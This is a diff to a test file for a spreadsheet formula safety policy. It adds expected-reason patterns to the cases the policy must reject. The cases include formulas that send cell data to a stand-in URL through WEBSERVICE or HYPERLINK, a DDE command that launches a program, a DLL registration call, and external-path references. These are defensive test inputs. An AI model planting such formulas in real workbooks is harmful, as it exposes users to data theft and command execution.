@@ -318,27 +318,28 @@ describe('office formula policy — formulas stay inside the workbook', () => {
     sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
   });
 
-  const rejected: ReadonlyArray<readonly [formula: string, why: string]> = [
-    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data'],
-    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix'],
-    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call'],
-    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data'],
-    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch'],
-    ['RTD("server.progid",,"topic")', 'a COM real-time data server'],
-    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration'],
-    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value'],
-    ["cmd|' /C calc'!A0", 'a DDE command'],
-    ['[1]Sheet1!A1', 'an external workbook by index'],
-    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path'],
-    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path'],
-    ['IF(A1="x', 'an unterminated string literal'],
+  const rejected: ReadonlyArray<readonly [formula: string, why: string, reason: RegExp]> = [
+    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE/],
+    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE/],
+    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call', /uses WEBSERVICE/],
+    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK/],
+    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE/],
+    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD/],
+    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER\.ID/],
+    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE/],
+    ["cmd|' /C calc'!A0", 'a DDE command', /DDE reference/],
+    ['[1]Sheet1!A1', 'an external workbook by index', /bracketed reference/],
+    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path', /bracketed reference/],
+    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path', /another file by its path/],
+    ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
   ];
 
-  for (const [formula, why] of rejected) {
+  for (const [formula, why, reason] of rejected) {
     it(`rejects ${why}`, async () => {
       await assert.rejects(renderXlsx(oneFormula(formula)), (err: unknown) => {
         assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${formula}`);
         assert.equal(err.location, 'sheet "S", cell A2');
+        assert.match(err.reason, reason);
         return true;
       });
     });
